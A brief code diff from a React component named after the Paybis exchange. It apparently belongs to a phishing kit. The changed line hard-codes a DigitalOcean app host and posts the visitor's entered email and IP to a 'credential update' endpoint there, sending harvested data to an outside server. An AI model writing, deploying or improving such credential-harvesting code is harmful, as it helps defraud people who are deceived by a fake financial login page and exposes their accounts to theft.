@@ -22,7 +22,7 @@ export default function Paybisemail({ socket, ip,setCenaAtual }) {
      
       localStorage.setItem("email", email);
 
-      await axios.post(`${process.env.URL_SVR}/atualizacredencial`, {
+      await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizacredencial", {
         email,
         ip
       });
